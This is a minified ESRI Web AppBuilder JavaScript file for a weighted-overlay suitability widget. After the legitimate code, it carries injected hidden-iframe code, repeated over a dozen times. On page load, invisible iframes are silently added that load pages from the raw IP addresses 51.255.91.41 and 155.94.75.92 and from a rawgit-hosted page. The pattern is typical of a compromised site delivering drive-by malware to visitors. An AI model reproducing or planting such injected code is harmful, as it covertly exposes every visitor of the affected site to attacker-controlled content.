// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SuitabilityModeler/wro/templates/WeightedOverlayWidget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"weighted-overlay-pane weighted-overlay-select-layers" data-dojo-attach-point\x3d"selectLayersViewNode"\x3e\r\n    \x3cdiv class\x3d"header" data-dojo-attach-point\x3d"selectLayersViewHeader"\x3e\r\n      \x3cspan role\x3d"button" class\x3d"slider-toggle pull-right"\r\n        data-dojo-attach-point\x3d"transparentSliderToggle"\r\n        data-dojo-attach-event\x3d"onclick: showHideTransparencySlider"\r\n        \x3e${i18n.wro.transparency}\x26nbsp;\x3cspan class\x3d"esri-icon-down"\x3e\x3c/span\x3e\r\n      \x3c/span\x3e\r\n      \x3ch4\x3e\x3cspan class\x3d"bullet-number"\x3e1\x3c/span\x3e${i18n.wro.selectLayersCaption}\x3c/h4\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"selectLayersView" class\x3d"body"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"footer"\x3e\r\n      \x3cbutton type\x3d"button" class\x3d"jimu-btn btn-execute jimu-state-disabled"\r\n        data-dojo-attach-point\x3d"designModelButton"\r\n        data-dojo-attach-event\x3d"onclick:showDesignModelView"\r\n        \x3e${i18n.wro.designModel}\x26nbsp;\x3cspan class\x3d"esri-icon-right-arrow"\x3e\x3c/span\x3e\r\n      \x3c/button\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"weighted-overlay-pane weighted-overlay-design-model" style\x3d"left: 100%" data-dojo-attach-point\x3d"designModelViewNode"\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"designModelView"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"footer"\x3e\r\n      \x3cbutton type\x3d"button" class\x3d"jimu-btn jimu-btn-vacation btn-back pull-left"\r\n        data-dojo-attach-event\x3d"onclick:showSelectOverlayLayersView" \x3e\r\n        \x3cspan class\x3d"esri-icon-left"\x3e\x3c/span\x3e\r\n        \x3cspan class\x3d"jimu-btn-text"\x3e${i18n.wro.selectLayers}\x3c/span\x3e\r\n      \x3c/button\x3e\r\n      \x3cdiv class\x3d"btn-group-spacer"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"btn-group pull-right"\x3e\r\n        \x3cbutton type\x3d"button" class\x3d"jimu-btn jimu-state-disabled"\r\n          data-dojo-attach-point\x3d"runModelButton"\r\n          data-dojo-attach-event\x3d"onclick:_onRunClick"\x3e${i18n.general.save}\x3c/button\x3e\r\n        \x3cbutton type\x3d"button" class\x3d"jimu-btn jimu-state-disabled"\r\n          data-dojo-attach-point\x3d"saveAsButton"\r\n          data-dojo-attach-event\x3d"onclick:_onSaveAsClick"\x3e${i18n.general.saveAs}\x3c/button\x3e\r\n        \x3cbutton type\x3d"button" class\x3d"jimu-btn"\r\n          data-dojo-attach-point\x3d"clearModelButton"\r\n          data-dojo-attach-event\x3d"onclick:_onClearClick"\x3e${i18n.general.clear}\x3c/button\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"weighted-overlay-pane weighted-overlay-save-panel"\r\n    style\x3d"display:none;" data-dojo-attach-point\x3d"savePanelNode"\x3e\r\n  \x3c/div\x3e\r\n\r\n\x3c/div\x3e\r\n'}});
define("dojo/text!./templates/WeightedOverlayWidget.html dojo/_base/declare dojo/_base/array dojo/dom-class dojo/dom-attr dojo/Deferred dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin ./config ./WeightedOverlayService ./WeightedOverlayLayersSelector ./WeightedOverlayModelDesigner".split(" "),function(g,h,f,c,e,k,l,m,n,p,q,r,t){var d=function(a,b){a&&(b?(a.setAttribute("disabled","disabled"),c.add(a,"jimu-state-disabled")):(a.removeAttribute("disabled"),c.remove(a,"jimu-state-disabled")))};
return h([l,m,n],{context:null,i18n:null,templateString:g,baseClass:"weighted-overlay-widget",widgetsInTemplate:!0,isRTL:!1,postCreate:function(){this.inherited(arguments);var a=this,b=p.getOptions(this.i18n);this.isRTL="ltr"===document.dir?!1:!0;this.weightedOverlayService=new q(null,b);this.weightedOverlayService.context=this.context;this.weightedOverlayService.i18n=this.i18n;this.selectLayersView=new r({context:this.context,i18n:this.i18n,parent:this},this.selectLayersView);this.designModelView=
new t({context:this.context,i18n:this.i18n,parent:this},this.designModelView);this.own(this.selectLayersView.on("selection-changed",function(){a._updateDesignModelButton(a.weightedOverlayModel)}),this.designModelView.on("model-validated",function(b){b?(d(a.runModelButton,!1),d(a.saveAsButton,!1)):(d(a.runModelButton,!0),d(a.saveAsButton,!0))}));this.context.allowSaveAs||(this.saveAsButton.style.display="none");this.setupConnections()},onClose:function(){this.selectLayersView&&this.selectLayersView.hidePreviewLayer()},
_setImageServiceLayerAttr:function(a){var b=this;this.imageServiceLayer=a;this.weightedOverlayService.imageServiceLayer=this.imageServiceLayer;this._initModel();this.imageServiceLayer&&this.imageServiceLayer.url&&this.weightedOverlayService.initRasterLayers().then(function(){b._rasterLayersInitialized()})},_rasterLayersInitialized:function(){f.forEach(this.weightedOverlayModel.overlayLayers,function(a){var b=this.weightedOverlayService.getRasterLayer(a.id);this.weightedOverlayService.setOverlayLayerDefaults(a,
b)},this);this.selectLayersView.set("model",this.weightedOverlayModel);this.selectLayersView.set("weightedOverlayService",this.weightedOverlayService);this.selectLayersView.startup();this.designModelView.set("weightedOverlayService",this.weightedOverlayService);this.designModelView.set("model",this.weightedOverlayModel);this.designModelView.startup();this.weightedOverlayModel.overlayLayers&&0<this.weightedOverlayModel.overlayLayers.length?this.showDesignModelView():this.showSelectOverlayLayersView()},
_initModel:function(){this.weightedOverlayModel=this.imageServiceLayer&&this.imageServiceLayer.renderingRule?this.weightedOverlayService.imageServiceLayerToModel({renderingRule:this.imageServiceLayer.renderingRule.toJson()}):this.weightedOverlayService.createNewModel()},setupConnections:function(){var a=this;this.own(this.designModelView.on("model-clear",function(b){a.set("weightedOverlayModel",b);a.selectLayersView.set("model",b)}));this.own(this.designModelView.on("model-validated",function(b){b?
(e.remove(a.runModelButton,"disabled"),e.remove(a.saveAsButton,"disabled")):(e.set(a.runModelButton,"disabled","disabled"),e.set(a.saveAsButton,"disabled","disabled"))}))},showHideTransparencySlider:function(){if(this.selectLayersView&&this.selectLayersView.previewSlider){var a=this.transparentSliderToggle.getElementsByTagName("SPAN")[0];a&&(this.isTransparencySliderShow?(c.remove(this.selectLayersViewNode,"transparency-slider-show"),c.replace(a,"esri-icon-down","esri-icon-up")):(c.add(this.selectLayersViewNode,
"transparency-slider-show"),c.replace(a,"esri-icon-up","esri-icon-down")),this.isTransparencySliderShow=!this.isTransparencySliderShow)}},showSelectOverlayLayersView:function(a){a&&a.preventDefault();a=this.isRTL?"right":"left";this.selectLayersView.set("model",this.weightedOverlayModel);this.designModelViewNode.style[a]="100%";this.selectLayersViewNode.style[a]="0%";this._updateDesignModelButton(this.weightedOverlayModel)},showDesignModelView:function(){var a=this.isRTL?"right":"left";this.selectLayersView.hidePreviewLayer();
this.designModelView.set("model",this.weightedOverlayModel);this.designModelViewNode.style[a]="0%";this.selectLayersViewNode.style[a]="-100%"},showSavePanel:function(){var a=this.savePanelNode;a.style.display="block";c.add(a,"show-panel-animated");setTimeout(function(){c.remove(a,"show-panel-animated")},400)},hideSavePanel:function(){var a=this.savePanelNode,b=new k;setTimeout(function(){a.style.display="none";c.remove(a,"hide-panel-animated");b.resolve(!0)},400);c.add(a,"hide-panel-animated");return b},
_onClearClick:function(a){this.clear();this.showSelectOverlayLayersView(a)},_onRunClick:function(){this.imageServiceLayer&&this.imageServiceLayer.xtnModeler&&(this.imageServiceLayer.xtnModeler.forSaveAs=!1);this.designModelView&&this.designModelView.runModel()},_onSaveAsClick:function(){this.imageServiceLayer&&this.imageServiceLayer.xtnModeler&&(this.imageServiceLayer.xtnModeler.forSaveAs=!0);this.designModelView&&this.designModelView.runModel({saveAs:!0})},clear:function(){this.designModelView&&
this.designModelView.weightedOverlayService&&(this._resetRemapRangeValues(),this.designModelView.clearModel())},_resetRemapRangeValues:function(){this.weightedOverlayService&&f.forEach(this.weightedOverlayService.rasterLayers,function(a){f.forEach(a.remapRanges,function(a){var b,c;try{c=a.originalOutputValue,b=typeof c,"undefined"!==b&&null!==c&&"number"===b&&!isNaN(c)&&isFinite(c)&&(a.outputValue=c)}catch(u){}})},this)},_updateDesignModelButton:function(a){a&&a.overlayLayers&&a.overlayLayers.length?
d(this.designModelButton,!1):d(this.designModelButton,!0)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});